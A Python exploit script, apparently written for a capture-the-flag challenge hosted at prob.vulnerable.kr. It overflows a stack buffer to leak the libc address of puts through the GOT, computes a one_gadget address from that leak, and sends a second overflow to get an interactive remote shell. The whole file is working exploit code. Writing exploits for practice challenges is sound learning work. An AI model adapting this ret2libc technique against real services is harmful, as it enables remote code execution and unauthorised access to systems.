#!/usr/bin/env python3

#-*- coding: utf-8 -*-
import socket
import time
import struct
import telnetlib
import os


def connect( ip, port ):
    return socket.create_connection((ip, port))

def p( x ):
    return struct.pack('<I', x )

def p64( x ):
    return struct.pack('<Q', x )

def u( x ):
    return struct.unpack('<I', x )[0]

def u64( x ):
    return struct.unpack('<Q', x )[0]

def interact( s ):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def main():
    #s = connect('localhost', 20002 )
    s = connect('prob.vulnerable.kr', 20002 )
    
    time.sleep( 1 )
    s.recv( 9999 )

    s.sendall( b'1\n' )

    payload = b''
    payload += b'A'*0x64
    payload += b'BBBB'  #rbp
    payload += p(0x80483e0) #PLT puts
    payload += p(0x804853b) #ret2main
    #payload += p(0x80483b9) #pop;ret
    payload += p(0x804a010) #GOT puts
    payload += b'\n'

    s.sendall( payload )

    time.sleep( 2 )
    d = s.recv( 9999 )
    s1 = b"That's AWESOME!\n"
    idx = d.find(s1)+len(s1)
    puts = u(d[idx:idx+4])
    print( 'puts :'+'%x'%puts )   
    
    
    print('second time!')
    s.sendall( b'1\n' )
    payload = b''
    payload += b'A'*0x64
    payload += b'BBBB'  #rbp
    payload += p(puts - 0x5f140 + 0x3a80c) #one_gadget = (puts-relative_puts):libc + relative_one_gadget
    payload += b'CCCC'   #ret
    payload += b'\n'
    
    s.sendall( payload )
    time.sleep( 5 )
    s.recv( 9999 )  #相手側の出力をここで受け取らないと、interact()後に返されたときバイナリ-文字列変換できなくてバグる
    interact( s )

if( __name__ == '__main__' ): main()
